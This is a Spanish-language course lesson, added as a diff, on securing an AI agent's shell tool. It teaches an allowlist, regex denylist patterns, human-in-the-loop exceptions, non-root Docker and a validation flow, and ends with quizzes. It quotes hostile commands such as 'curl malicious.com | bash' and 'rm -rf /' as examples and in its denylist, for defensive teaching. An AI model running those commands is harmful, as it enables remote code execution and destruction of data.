@@ -1,0 +1,231 @@
+---
+title: "Shell Controls & Exceptions"
+description: "Allowlist/denylist para comandos shell, HitlRequiredException, y patrones de seguridad"
+xpReward: 125
+---
+
+## Shell: La Tool Más Peligrosa
+
+`run_command` es la tool más poderosa y más peligrosa. Permite ejecutar cualquier comando del sistema operativo. Sin controles, un LLM podría ejecutar `curl malicious.com | bash` o `rm -rf /`.
+
+<Callout variant="error" title="El riesgo de shell execution">
+A diferencia de tools como `get_weather` que tienen un scope limitado, `run_command` tiene scope ilimitado. Es equivalente a darle una terminal al LLM. Cada comando debe ser validado.
+</Callout>
+
+## Allowlist: Solo Comandos Aprobados
+
+```python
+# app/config.py
+agent_shell_allowlist: str = (
+    "pytest,ruff,mypy,make,npm,git,"
+    "cat,head,tail,wc,ls,find,grep,"
+    "echo,python,node"
+)
+```
+
+Antes de ejecutar un comando, se verifica que el **primer token** esté en la allowlist:
+
+```python
+def _is_command_allowed(command: str, allowlist: list[str]) -> bool:
+    """Check if the command's base binary is in the allowlist."""
+    # Extraer el primer token (el programa)
+    parts = command.strip().split()
+    if not parts:
+        return False
+
+    base_command = parts[0]
+
+    # Manejar paths: /usr/bin/python → python
+    base_command = base_command.rsplit("/", 1)[-1]
+
+    return base_command in allowlist
+```
+
+<Concept title="Allowlist > Denylist">
+Una allowlist define qué está PERMITIDO (todo lo demás se bloquea). Una denylist define qué está PROHIBIDO (todo lo demás se permite). Para seguridad, allowlist es siempre más seguro — no podés olvidarte de bloquear un comando nuevo peligroso.
+</Concept>
+
+## Denylist: Patrones Peligrosos
+
+Además de la allowlist, hay una denylist de patrones que se bloquean incluso si el comando base está permitido:
+
+```python
+# Patterns that are always blocked, even if base command is allowed
+_SHELL_DENYLIST_PATTERNS = [
+    r".*&&.*",        # Command chaining: ls && rm -rf
+    r".*\|\|.*",      # OR chaining: false || rm -rf
+    r".*;\s*rm.*",    # Semicolon + rm
+    r".*>\s*/etc/.*", # Redirect to /etc
+    r".*curl.*\|\s*bash.*",    # Pipe curl to bash
+    r".*wget.*\|\s*(ba)?sh.*", # Pipe wget to bash
+    r".*eval\s.*",    # eval command
+    r".*exec\s.*",    # exec command
+    r".*sudo\s.*",    # sudo
+    r".*chmod\s+[0-7]*7.*",  # World-writable permissions
+]
+
+def _matches_denylist(command: str) -> tuple[bool, str]:
+    """Check if command matches any denylist pattern."""
+    for pattern in _SHELL_DENYLIST_PATTERNS:
+        if re.fullmatch(pattern, command, re.IGNORECASE):
+            return True, f"Matches denylist: {pattern}"
+    return False, ""
+```
+
+<Callout variant="warning" title="Doble capa: allowlist + denylist">
+El comando `git push origin main` pasa la allowlist (git está permitido) pero podría ser interceptado por una policy rule FLAG. El comando `git && rm -rf /` pasa la allowlist (git) pero es bloqueado por la denylist (patrón `&&`). Las dos capas se complementan.
+</Callout>
+
+## HitlRequiredException
+
+Cuando una acción requiere HITL pero no hay callback disponible, se lanza una excepción especial:
+
+```python
+# app/security/exceptions.py
+class SecurityException(Exception):
+    """Base for all security errors."""
+    pass
+
+class HitlRequiredException(SecurityException):
+    """Raised when a tool requires HITL but no callback is available."""
+
+    def __init__(
+        self,
+        tool_name: str,
+        arguments: dict,
+        reason: str,
+        rule_id: str | None = None,
+    ):
+        self.tool_name = tool_name
+        self.arguments = arguments
+        self.reason = reason
+        self.rule_id = rule_id
+        super().__init__(
+            f"Tool '{tool_name}' flagged for HITL approval. "
+            f"Reason: {reason}"
+        )
+```
+
+## Docker: Container Security
+
+El agente corre dentro de Docker con restricciones adicionales:
+
+```dockerfile
+# Dockerfile
+# Crear usuario no-root
+RUN groupadd -g 1000 appuser && \
+    useradd -u 1000 -g appuser appuser
+
+# Cambiar a usuario no-root
+USER appuser
+
+# CMD final
+CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
+```
+
+<Concept title="UID 1000: no root">
+El container corre como `appuser` (UID 1000), no como root. Incluso si el agente ejecuta un comando malicioso, no tiene permisos para modificar archivos del sistema o instalar paquetes. Defense in depth a nivel de OS.
+</Concept>
+
+## Patrones de Seguridad: Resumen
+
+| Patrón | Implementación | Tipo |
+|--------|---------------|------|
+| **Fail-closed** | PolicyEngine → BLOCK si YAML roto | Preventivo |
+| **Least privilege** | agent_write_enabled=False default | Preventivo |
+| **Allowlist** | Shell commands validados contra lista | Preventivo |
+| **Denylist** | Patterns peligrosos bloqueados | Preventivo |
+| **HITL** | asyncio.Event para aprobación humana | Interactivo |
+| **Audit trail** | SHA-256 hash chain append-only | Detectivo |
+| **Container isolation** | Docker USER appuser (non-root) | Aislamiento |
+| **Timeout** | 120s HITL + 300s session timeout | Safety net |
+
+## El Flujo de Validación Completo
+
+```python
+async def _validate_and_execute(
+    tool_call, policy_engine, audit_trail,
+    hitl_callback, allowlist,
+):
+    tool_name = tool_call.name
+    args = tool_call.arguments
+
+    # 1. Shell allowlist check (si es run_command)
+    if tool_name == "run_command":
+        cmd = args.get("command", "")
+        if not _is_command_allowed(cmd, allowlist):
+            return f"BLOCKED: '{cmd}' not in shell allowlist"
+        denied, reason = _matches_denylist(cmd)
+        if denied:
+            return f"BLOCKED: {reason}"
+
+    # 2. Policy engine check
+    decision = policy_engine.evaluate(tool_name, args)
+
+    # 3. Audit: registrar decisión
+    audit_trail.record(
+        tool_name=tool_name,
+        arguments=args,
+        decision=decision.action.value,
+        decision_reason=decision.reason,
+    )
+
+    # 4. Actuar según decisión
+    if decision.is_blocked:
+        return f"BLOCKED: {decision.reason}"
+
+    if decision.requires_flag:
+        if not hitl_callback:
+            raise HitlRequiredException(tool_name, args, decision.reason)
+        approved = await hitl_callback(tool_name, args, decision.reason)
+        if not approved:
+            return "DENIED: User rejected the action"
+
+    # 5. Ejecutar la tool
+    result = await execute_tool(tool_call)
+
+    # 6. Audit: registrar resultado
+    audit_trail.record(
+        tool_name=tool_name,
+        arguments=args,
+        decision="executed",
+        execution_result=str(result)[:500],
+    )
+
+    return result
+```
+
+<Quiz
+  question="¿Por qué se usa una allowlist en vez de una denylist para shell commands?"
+  options={[
+    "Porque es más fácil de escribir",
+    "Porque una allowlist bloquea todo por defecto — no podés olvidarte de bloquear un comando nuevo peligroso",
+    "Porque Python no soporta denylist",
+    "No hay diferencia de seguridad"
+  ]}
+  correct={1}
+/>
+
+<Quiz
+  question="¿Qué pasa si el agente intenta ejecutar 'git && rm -rf /'?"
+  options={[
+    "Se ejecuta porque 'git' está en la allowlist",
+    "Se bloquea por la denylist (patrón '&&' detectado) aunque 'git' está en la allowlist",
+    "Se envía al HITL para aprobación",
+    "Se ignora silenciosamente"
+  ]}
+  correct={1}
+/>
+
+<Quiz
+  question="¿Por qué el container Docker corre como appuser (UID 1000) y no como root?"
+  options={[
+    "Porque Docker lo requiere",
+    "Para defense in depth: incluso si un comando malicioso se ejecuta, no tiene permisos de root para dañar el sistema",
+    "Porque root es más lento",
+    "Es solo una convención"
+  ]}
+  correct={1}
+/>
+
+Has completado el módulo Agentic Security & HITL. Ahora entendés cómo LocalForge permite autonomía a sus agentes mientras mantiene control humano y trazabilidad inmutable de cada acción.
